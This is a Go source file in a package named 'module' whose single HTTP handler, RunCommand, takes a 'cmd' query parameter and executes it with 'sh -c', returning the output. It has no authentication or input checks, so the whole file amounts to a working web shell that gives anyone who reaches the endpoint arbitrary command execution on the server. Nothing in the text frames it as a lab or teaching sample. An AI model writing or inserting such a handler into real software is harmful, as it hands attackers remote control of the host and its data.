package module

import (
	"fmt"
	"net/http"
	"os/exec"
)

func RunCommand(w http.ResponseWriter, r *http.Request) {
	cmd := r.URL.Query().Get("cmd")
	out, err := exec.Command("sh", "-c", cmd).CombinedOutput()
	if err != nil {
		http.Error(w, fmt.Sprintf("error: %v", err), 500)
		return
	}
	w.Write(out)
}
